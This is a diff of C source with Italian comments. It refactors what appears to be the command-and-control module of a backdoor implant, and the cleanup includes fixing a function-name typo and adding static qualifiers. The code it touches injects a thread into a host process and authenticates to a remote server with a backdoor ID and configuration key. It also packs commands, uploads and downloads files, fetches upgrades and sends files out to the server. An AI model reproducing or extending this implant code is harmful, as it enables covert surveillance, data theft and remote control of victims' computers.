@@ -15,12 +15,14 @@ static WCHAR *wRequest_array[] = {
 		L"/index.jsp"
 	};
 
+static BYTE asp_global_session_key[16];
+
 ///////////////////////////////////////////
 // Funzioni per lanciare il thread ASP   //
 ///////////////////////////////////////////
 
 // Thread remoto iniettato nel processo ASP host
-DWORD ASP_HostThread(ASP_THREAD *pDataThread)
+DWORD WINAPI ASP_HostThread(ASP_THREAD *pDataThread)
 {
 	HMODULE hASPDLL;
 	ASP_MainLoop_t pASP_MainLoop;
@@ -150,32 +152,30 @@ BYTE *ParseResponse(BYTE *ptr, DWORD len, DWORD *command, DWORD *message_len)
 }
 
 // Prende un buffer e lo dumpa su file
-BOOL WriteBufferOnFile(WCHAR *file_path, BYTE *buffer, DWORD buf_len)
+static BOOL WriteBufferOnFile(WCHAR *file_path, BYTE *buffer, DWORD buf_len)
 {
-	HANDLE hfile;
-	DWORD n_read;
-
 	if (buffer == NULL || file_path == NULL)
 		return FALSE;
 
-	hfile = CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
-	if (hfile == INVALID_HANDLE_VALUE) 
+	HANDLE hFile = CreateFileW(file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) 
 		return FALSE;
 
 	while (buf_len > 0) {
-		if (!WriteFile(hfile, buffer, buf_len, &n_read, NULL) || n_read==0) {
-			CloseHandle(hfile);
+		DWORD n_read = 0;
+		if (!WriteFile(hFile, buffer, buf_len, &n_read, NULL) || n_read==0) {
+			CloseHandle(hFile);
 			return FALSE;
 		}
 		buffer += n_read;
 		buf_len -= n_read;
 	}
-	CloseHandle(hfile);
+	CloseHandle(hFile);
 	return TRUE;
 }
 
 // Genera una sequenza di byte a caso
-void rand_bin_seq(BYTE *buffer, DWORD buflen)
+static void rand_bin_seq(BYTE *buffer, DWORD buflen)
 {
 	DWORD i;
 	static BOOL first_time = TRUE;
@@ -292,7 +292,7 @@ BOOL HttpTransaction(BYTE *s_buffer, DWORD sbuf_len, BYTE **r_buffer, DWORD *res
 
 // Crea il buffer da inviare per un comando piu' messaggio
 // il buffer ritornato va liberato
-BYTE *PreapareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
+BYTE *PrepareCommand(DWORD command, BYTE *message, DWORD msg_len, DWORD *ret_len)
 {
 	SHA1Context sha;
 	DWORD tot_len, pad_len, i;
@@ -434,25 +434,6 @@ BYTE *PrepareFile(WCHAR *file_path, DWORD *ret_len)
 	return buffer;
 }
 
-// Ritorna la stringa pascalizzata
-// il buffer ritornato va liberato
-BYTE *PascalizeString(WCHAR *string, DWORD *retlen)
-{
-	DWORD len;
-	BYTE *buffer;
-
-	len = (wcslen(string)+1)*sizeof(WCHAR);
-	buffer = (BYTE *)malloc(len+sizeof(DWORD));
-	if (!buffer)
-		return NULL;
-	ZeroMemory(buffer, len+sizeof(DWORD));
-	memcpy(buffer, &len, sizeof(DWORD));
-	wcscpy_s((WCHAR *)(buffer+sizeof(DWORD)), len/sizeof(WCHAR), string); 
-
-	*retlen = len+sizeof(DWORD);
-	return buffer;
-}
-
 // Risolve server_url
 BOOL H_ASP_ResolveName(char *server_url, char *addr_to_connect, DWORD buflen)
 {
@@ -590,7 +571,7 @@ BOOL H_ASP_WinHTTPSetup(char *server_url, char *addr_to_connect, DWORD buflen, D
 
 #define AUTH_REAL_LEN 112
 // Esegue il passi di AUTH
-BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len, char *instance, DWORD inst_len, char *subtype, DWORD sub_len, char *conf_key, DWORD ckey_len, DWORD *response_command)
+static BOOL H_ASP_Auth(char *signature, DWORD sig_len, char *backdoor_id, DWORD bid_len, char *instance, DWORD inst_len, char *subtype, DWORD sub_len, char *conf_key, DWORD ckey_len, DWORD *response_command)
 {
 	BYTE buffer[AUTH_REAL_LEN+16];
 	BYTE *response;
@@ -737,7 +718,7 @@ BYTE *H_ASP_ID(WCHAR *user_id, WCHAR *device_id, WCHAR *source_id, DWORD *respon
 		memcpy(ptr, p_src, l_src);
 
 		// Crea il comando
-		if (!(buffer = PreapareCommand(PROTO_ID, message, sizeof(DWORD)+l_usr+l_dev+l_src, &buffer_len)))
+		if (!(buffer = PrepareCommand(PROTO_ID, message, sizeof(DWORD)+l_usr+l_dev+l_src, &buffer_len)))
 			break;
 
 		// Invia il buffer
@@ -781,7 +762,7 @@ BOOL H_ASP_GenericCommand(DWORD command, DWORD *response_command, BYTE **respons
 
 	do {
 		// Crea il comando
-		if (!(buffer = PreapareCommand(command, NULL, 0, &buffer_len)))
+		if (!(buffer = PrepareCommand(command, NULL, 0, &buffer_len)))
 			break;
 
 		// Invia il buffer
@@ -824,7 +805,7 @@ BOOL H_ASP_GenericCommandPL(DWORD command, BYTE *payload, DWORD payload_len, DWO
 
 	do {
 		// Crea il comando
-		if (!(buffer = PreapareCommand(command, payload, payload_len, &buffer_len)))
+		if (!(buffer = PrepareCommand(command, payload, payload_len, &buffer_len)))
 			break;
 
 		// Invia il buffer
@@ -864,7 +845,6 @@ BOOL H_ASP_GetUpload(BOOL is_upload, DWORD *response_command, WCHAR **file_name,
 	DWORD response_message_len;
 	DWORD file_name_len;
 	DWORD file_body_len;
-	HANDLE hfile = INVALID_HANDLE_VALUE;
 	WCHAR file_path[MAX_PATH];
 	DWORD command = PROTO_UPGRADE;
 
@@ -878,7 +858,7 @@ BOOL H_ASP_GetUpload(BOOL is_upload, DWORD *response_command, WCHAR **file_name,
 
 	do {
 		// Crea il comando
-		if (!(buffer = PreapareCommand(command, NULL, 0, &buffer_len)))
+		if (!(buffer = PrepareCommand(command, NULL, 0, &buffer_len)))
 			break;
 
 		// Invia il buffer
@@ -917,7 +897,6 @@ BOOL H_ASP_GetUpload(BOOL is_upload, DWORD *response_command, WCHAR **file_name,
 		ret_val = TRUE;
 	} while(0);
 
-	CloseHandle(hfile);
 	SAFE_FREE(buffer);
 	SAFE_FREE(response);
 	return ret_val;
@@ -968,6 +947,20 @@ BOOL H_ASP_SendFile(WCHAR *file_path, DWORD byte_per_second, DWORD *response_com
 								ASP_IPC_command->out_param_len = msg_len; \
 								SAFE_FREE(message);	} else ASP_IPC_command->out_param_len = 0;
 
+static BOOL doAuth(ASP_REQUEST_AUTH *ra)
+{
+	return H_ASP_Auth(CLIENT_KEY, 16, ra->backdoor_id, strlen(ra->backdoor_id), (char*)ra->instance_id, 20, ra->subtype, strlen(ra->subtype), (char*)ra->conf_key, 16, &ASP_IPC_command->out_command);
+}
+
+static BOOL doBye()
+{
+	DWORD msg_len;
+	BYTE* message = NULL;
+	BOOL r = H_ASP_GenericCommand(PROTO_BYE, &ASP_IPC_command->out_command, &message, &msg_len);
+	SAFE_FREE(message);
+	return r;
+}
+
 void WINAPI ASP_MainLoop(char *asp_server)
 {
 	BOOL ret_success = FALSE;
@@ -1006,12 +999,10 @@ void WINAPI ASP_MainLoop(char *asp_server)
 
 		// Esegue la spedizione/ricezione dei dati a seconda dell'action
 		if (ASP_IPC_command->action == ASP_AUTH) {
-			ASP_REQUEST_AUTH *ra  = (ASP_REQUEST_AUTH *)ASP_IPC_command->in_param;
-			ret_success = H_ASP_Auth(CLIENT_KEY, 16, ra->backdoor_id, strlen(ra->backdoor_id), (char *)ra->instance_id, 20, ra->subtype, strlen(ra->subtype), (char *)ra->conf_key, 16, &ASP_IPC_command->out_command);
+			ret_success = doAuth((ASP_REQUEST_AUTH*)ASP_IPC_command->in_param);
 
 		} else if (ASP_IPC_command->action == ASP_BYE) {
-			ret_success = H_ASP_GenericCommand(PROTO_BYE, &ASP_IPC_command->out_command, &message, &msg_len);
-			SAFE_FREE(message);
+			ret_success = doBye();
 
 		} else if (ASP_IPC_command->action == ASP_IDBCK) {
 			ASP_REQUEST_ID *ri  = (ASP_REQUEST_ID *)ASP_IPC_command->in_param;
@@ -1068,11 +1059,7 @@ void WINAPI ASP_MainLoop(char *asp_server)
 
 		}
 
-
 		// Notifica la fine delle operazioni di lettura/scrittura
-		if (ret_success)
-			ASP_IPC_command->status = ASP_DONE;
-		else
-			ASP_IPC_command->status = ASP_ERROR;
+		ASP_IPC_command->status = (ret_success) ? ASP_DONE : ASP_ERROR;
 	}
 }
